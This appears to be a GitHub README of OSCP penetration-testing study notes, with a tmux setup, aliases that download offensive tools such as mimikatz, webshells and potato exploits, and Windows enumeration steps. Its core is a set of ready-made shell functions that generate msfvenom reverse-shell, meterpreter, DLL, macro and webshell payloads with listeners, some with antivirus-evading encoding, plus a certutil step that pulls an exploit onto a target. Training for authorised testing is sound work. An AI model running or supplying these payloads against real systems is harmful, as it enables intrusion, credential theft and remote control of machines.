![image](https://user-images.githubusercontent.com/68156940/209417567-3f40c937-b11d-4919-b01a-a13d1ab74521.png)


# OSCP-Notes

Study Notes for OSCP

- [Attack Machine Setup](#attack-machine-setup)
  - [Tmux Configuration](#Tmux)
  - [Bash Aliases](#Aliases)
- [Port Scanning](#port-scanning)
- [Active Recon](#recon)
  - [DNS](#dns)
  - [NFS](#nfs)
  - [SMB](#smb)
  - [SMTP](#smtp)
  - [SNMP](#snmp)
  - [HTTP/HTTPS](#http)
- [Exploitation](#exploitation)
  - [Web Apps](#webapp)
    - [Burpsuite](#burpsuite)
    - [LFI](#LFI)
    - [Cross Site Scripting (XSS)](#XSS)
      - JavaScript Injection
      - Stealing Cookies
    - [Web App Scanning](#Scanning)
      - Nikto
      - Dirsearch
    - [SQL Injection](#SQLi)
  - [Public Exploits](#public-exploits)
  - [Buffer Overflow](#buffer-overflow)
    - [Linux Buffer Overflow](#linux-buffer-overflow)
    - [Windows Buffer Overflow](#windows-buffer-overflow)
- [Windows Privilege Escalation](#windows-privilege-escalation)
- [Linux Privilege Escalation](#linux-privilege-escalation)
- [Active Directory (AD)](#Active-Directory)
  - [Lateral Movement](#lateral-movement) 
- [Post Exploitation](#post-exploitation)
  - [File Transfers](#file-transfers)
    - [Netcat](#netcat)
    - [Socat](#socat)
    - [Powershell](#powershell)
    - [Powercat](#powercat)
- [Pivoting](#pivoting) 


## Attack Machine Setup

### Tmux
`tmux` conf that allows for copy/pasting and other convenient options within Tmux 

1. Create a `~/.tmux.conf` file
2. Source the conf file by running `source ~/.tmux.conf`


```bash
# Linux only
set -g mouse on
bind -n WheelUpPane if-shell -F -t = "#{mouse_any_flag}" "send-keys -M" "if -Ft= '#{pane_in_mode}' 'send-keys -M' 'select-pane -t=; copy-mode -e; send-keys -M'"
bind -n WheelDownPane select-pane -t= \; send-keys -M
bind -n C-WheelUpPane select-pane -t= \; copy-mode -e \; send-keys -M
bind -T copy-mode-vi    C-WheelUpPane   send-keys -X halfpage-up
bind -T copy-mode-vi    C-WheelDownPane send-keys -X halfpage-down
bind -T copy-mode-emacs C-WheelUpPane   send-keys -X halfpage-up
bind -T copy-mode-emacs C-WheelDownPane send-keys -X halfpage-down

# To copy, left click and drag to highlight text in yellow, 
# once you release left click yellow text will disappear and will automatically be available in clibboard
# # Use vim keybindings in copy mode
setw -g mode-keys vi
# Update default binding of `Enter` to also use copy-pipe
unbind -T copy-mode-vi Enter
bind-key -T copy-mode-vi Enter send-keys -X copy-pipe-and-cancel "xclip -selection c"
bind-key -T copy-mode-vi MouseDragEnd1Pane send-keys -X copy-pipe-and-cancel "xclip -in -selection clipboard"
set-option -g default-shell /bin/zsh
set -g @plugin 'tmux-plugins/tpm'
set -g @plugin 'tmux-plugins/tmux-sensible'
set -g @plugin 'tmux-plugins/tmux-resurrect'
set -g @plugin 'tmux-plugins/tmux-continuum'

set -g @continuum-restore 'on'
run '~/.tmux/plugins/tpm/tpm'
```

## Bash Aliases

### Aliases
Useful aliases for file transfers, HTTP server setup, etc. 

Aliases can be put in ~/.zshrc or ~/.bashrc, and sourced. 

*NOTE: Make sure to run `source ~/.zshrc` after adding aliases.*


### Nmap Scanning: 
```
# Nmap scans 
alias autoreconbasic='sudo $(which autorecon) $IP'
alias tcpscan=''
alias udpscan=''
alias tcptop100=''
alias udptop100=''
alias fullscan=''
alias nmapautomatorfull='nmapAutomator -H $IP -t all'
```

### HTTP Enumeration:
```
# HTTP Enum
alias httpsearch='dirsearch -u http://$IP -o ./http.txt'
alias httpssearch='dirsearch -u https://$IP -o ./https.txt'
```

### Portable Servers (SMB, HTTP, etc): 
```
# Portable servers 
alias smbserver='/usr/share/doc/python3-impacket/examples/smbserver.py -smb2support MYSHARE .'
function httpserver() { 
    local port="${1:-8000}"
    python3 -m http.server "$port"
}
alias apacheserver='sudo systemctl start apache2'
```

### Tool Grabbing: 
```
# Tool grabbing 
alias sherlock='wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1'

alias powerview='cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 . && echo "\npowerview.ps1 has been transferred to ${$(pwd)}"'

alias getspn='cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/Get-SPN.ps1 . && echo "\nGet-SPN.ps1 has been transferred to ${$(pwd)}"'
alias plink='cp /usr/share/windows-resources/binaries/plink.exe . && echo "\nplink.exe has been transferred to ${$(pwd)}"'
alias winprivescpack='sudo cp /opt/privesc.zip . && echo "\bPrivesc.zip toolpack has been transferred to ${$(pwd)}"'
alias winpeasbat='wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat && echo "\nWinPEAS.bat has been downloaded to ${$(pwd)}"'
alias winpeas='wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe && echo "\nWinPEAS has been downloaded tto ${$(pwd)}"'
alias linpeas='wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh && echo "\nLinPEAS has been downloaded to ${$(pwd)}"'
alias activedirpack='sudo cp /opt/active_directory.zip . && echo "\nActive directory toolpack has been transferred to ${$(pwd)}"'
alias mimi32='cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe . && echo "\nMimikatz 32 Bit has been transferred to ${$(pwd)}"'
alias mimi64='cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe . && echo "\nMimikatz 64 Bit has been transferred to ${$(pwd)}"'
alias mimi211x86='wget https://github.com/allandev5959/mimikatz-2.1.1/raw/master/Win32/mimikatz.exe'
alias mimi211x64='wget https://github.com/allandev5959/mimikatz-2.1.1/raw/master/x64/mimikatz.exe'
alias nc32='cp /usr/share/windows-resource/binaries/nc.exe . && echo "\nNetcat 32-bit has been transferred to ${$(pwd)}"'
alias nc64='wget https://github.com/int0x33/nc.exe/raw/master/nc64.exe'
alias phprevshell='cp /usr/share/webshells/php/php-reverse-shell.php . && echo "\nPHP-Reverse-Shell.php has been transferred to ${$(pwd)}"'
alias juicypotato='wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe'
alias hotpotato='cp ~/Desktop/tools/potato.exe . && echo "\npotato.exe has been transferred to ${$(pwd)}"'
alias roguepotato='cp ~/Desktop/tools/RoguePotato.exe . && echo "\nRoguePotato.exe has been transferred to ${$(pwd)}"'
alias accesschk='cp ~/Desktop/tools/accesschk.exe . && echo "\nAccesschk.exe has been transferred to ${$(pwd)}"'
alias winpeasany='cp ~/Desktop/tools/winPEASany.exe . && echo "\nwinPEASany.exe has been transferred to ${$(pwd)}"'
alias seatbelt='cp ~/Desktop/tools/seatbelt.exe && echo "\nseatbelt.exe has been transferred to ${$(pwd)}"'
alias fgdump='cp /usr/share/windows-resources/binaries/fgdump/fgdump.exe .'
alias testwebshell='wget https://raw.githubusercontent.com/WhiteWinterWolf/wwwolf-php-webshell/master/webshell.php'
alias lse='wget https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh -O lse.sh;chmod 700 lse.sh && echo "\nlse.sh has been downloaded to ${$(pwd)}"'
alias les2='curl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl > les2.pl; chmod +x les2.pl && echo "\nLinux exploit suggester has been downloaded to ${$(pwd)}"'
alias phprevshellwin='curl https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php > php-reverse-shell-win.php'

```

### Windows Reverse TCP Shells
```
# Staged and unstaged Windows Shells
function staged32win() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell/reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x86-staged.exe && echo "\npayload listen on port ${port}"
    nc -nvlp $port
}
function staged64win() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/shell/reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x64-staged.exe && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function unstaged32win() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell_reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x86-unstaged.exe && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function unstaged64win() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell_reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x64-unstaged.exe && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
```

### Linux Reverse TCP Shells
```
# Staged and unstaged Linux Shells
function staged32lin() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x86/shell/reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x86-staged.elf && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function staged64lin() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x64/shell/reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x64-staged.elf && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function unstaged32lin() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x86/shell_reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x32-unstaged.elf && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function unstaged64lin() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x64_shell_reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x64-unstaged.elf && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
```

### Macro Document Shells
```
# Macro Document shells
function macropayload() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell_reverse_tcp LHOST=$host LPORT=$port -f hta-psh -o evil.hta && echo "\npayload listen on port ${port}"
    nc -nvlp $port
}
```

### Metasploit Webshells 
```
# Metasploit shells - Webshells 
function javashell() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$host LPORT=$port -f raw > shell.jsp && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function warshell() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p java/jsp_shell_reverse_tcp LHOST=$host LPORT=$port -f war > shell.war && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function phpshell() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p php/reverse_php LHOST=$host LPORT=$port -f raw > shell.php && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
function aspshell() {  
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/shell/reverse_tcp LHOST=$host LPORT=$port -f asp > shell.asp && echo "\npayload listens on port ${port}"
    nc -nvlp $port
}
```

### Windows Meterpreter Shells
```
# Meterpreter shells-  Windows 
function meterpreterwin32staged() {
    local host="${1:-tun0}"
    local port="${2:-8000}"    
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x86-staged.exe && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;          set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit"
}
function meterpreterwin32unstaged() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x86-unstaged.exe && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/meterpreter_reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;          set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit"
}

function meterpreterwin64staged() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x64-staged.exe && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;      set StageEncoder x86/shikata_ga_nai; set AutoRunScript post/windows/manage/migrate; exploit"
}
function meterpreterwin64unstaged() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f exe > shell-x64-unstaged.exe && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_tcp; set LHOST tun0; set LPORT $port; set AutoRunScript post/windows/manage/migrate; exploit"
}
```

### Linux Meterpreter Shells
```
# Meterpreter shells - Linux
function meterpreterlin32staged() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x86-staged.elf && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;        set StageEncoder x86/shikata_ga_nai;exploit"   
}
function meterpreterlin64staged() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x64-staged.elf && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;        set StageEncoder x86/shikata_ga_nai;exploit"
}

function meterpreterlin32unstaged() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x86-unstaged.elf && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter_reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;        set StageEncoder x86/shikata_ga_nai;exploit"
}
function meterpreterlin64unstaged() {
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=$host LPORT=$port -f elf > shell-x64-unstaged.elf && echo "\npayload listens on port ${port}"
    msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter_reverse_tcp; set LHOST tun0; set LPORT $port; set EnableStageEncoding true;        set StageEncoder x86/shikata_ga_nai;exploit"
}
```

### Windows DLL Shells
```
# Staged - x64
function dllshellstagedx64() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/shell/reverse_tcp lhost=$host lport=$port -e x86/shikata_ga_nai -f dll > shell.txt && "\nPayload listens on port ${port}. Payload is stored in ${$(pwd)} directory"
    nc -nvlp $port
}

# Staged x86
function dllshellstagedx86() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x86/shell/reverse_tcp lhost=$host lport=$port -f dll > shell.txt && "\nPayload listens on port ${port}. Payload is stored in ${$(pwd)} directory"
    nc -nvlp $port
}

# Unstaged x64
function dllshellunstagedx64() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x64/shell_reverse_tcp lhost=$host lport=$port -f dll > shell.txt && "\nPayload listens on port ${port}. Payload is stored in ${$(pwd)} directory"
    nc -nvlp $port
}

# Unstaged x86
function dllshellunstagedx86() { 
    local host="${1:-tun0}"
    local port="${2:-8000}"
    msfvenom -p windows/x86/shell_reverse_tcp lhost=$host lport=$port -f dll > shell.txt && "\nPayload listens on port ${port}. Payload is stored in ${$(pwd)} directory"  
    nc -nvlp $port
}
```

### Compiling C Code: 
```
function x86compile() { 
     i686-w64-mingw32-gcc $1 -o $2 -lws2_32
}

function x64compile() { 
    i686-w64-mingw32-gcc $1 -o $2
}

function x86compileandrun() { 
    i686-w64-mingw32-gcc $1 -o $2 -lsw2_32 && wine $2
}

function x64compileandrun() { 
    i686-w64-mingw32-gcc $1 -o $2 && wine $2
}
```

## Windows Privilege Escalation

### System Enum

Get System Information
```cmd
systeminfo
```
Grabbing OS Name and Version
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
View patches
```cmd
wmic qfe
```

```cmd
wmic qfe get caption,Description,HotFixId,InstalledOn
```

Get list of Drives
```cmd
wmic logicaldisk get caption,description,providername
```



### User Enum
Get current user
```cmd
whoami
```
Get current user privileges
```cmd
whoami /priv
```

Get list of groups current user is inside of
```cmd
whoami /groups
```

List users on machine
```cmd
net user
```

```cmd
net user $USER
```

Query group membership

```cmd
net localgroup
```

```cmd
localgroup <group name>
```

### Network Enum
List IP addresses and network configs
```cmd
ipconfig /all
```

Dump arp cache 
```cmd
arp -a
```
*Note: If the IP Address for `arp -a` is different from the default gateway or DNS, it could be a sign of the machine being connected to an AD Domain Controller.*

List route table 
```cmd
route print
```

List ports and listening ports
```cmd
netstat -ano
```

### Password Searching

Searching for passwords in current directory
```cmd
findstr /si password *.txt *.ini *.config 
```
```cmd
findstr /si Password: *.txt *.ini *.config 
```

```cmd
findstr /si Username: Password: *.txt *.ini *.config 
```

```cmd
findstr /si password= *.txt *.ini *.config 
```

### Antivirus Enum

Discovering AV (Windows Defender)
```cmd
sc query windefend
```

Discovering services
```cmd
sc query type=service
```

Discovering firewalls 
```cmd
netsh advfirewall firewall dump
```
Discovering firewalls (Legacy) 
```cmd
netsh firewall show state
```

Firewall config 
```cmd
netsh firewall show config
```

### Automated Tools 
Tools that perform automated privesc enum on Windows boxes: 

**WinPEAS**

```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEAS.bat

wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany.exe
```
*If WinPEASany.exe fails, it may either be blocked by antivirus or the target **does not have .NET version 4.0**. Try to run WinPEAS.bat instead.*

**Seatbelt**

```bash
https://github.com/GhostPack/Seatbelt
```

**Watson** 

```bash
https://github.com/rasta-mouse/Watson
```

**SharpUp**

```bash
https://github.com/GhostPack/SharpUp
```

**windows-exploit-suggester**

```bash
wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
```

**Sherlock.ps1** 

```bash
wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
```

**PowerUp.ps1**

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

**jaws-enum.ps1**

```bash
wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
```

### Kernel Exploits


1. Run `windows-exploit-suggester.py` and choose an exploit from the listed output
```bash
python windows-exploit-suggester.py --database $DB --systeminfo /path/to/sysinfo.txt
```
2. Run lightweight python server on Kali machine to host exploit executable: 
```bash
python3 -m http.server 80
```
3. Navigate to `temp` folder on windows target: 
```cmd
cd C:\Windows\temp
```
4. Use `Certutil` to grab exploit from kali machine: 
```cmd
certutil -urlcache -f http://$IP/Exploit.exe
```
5. Run the exploit



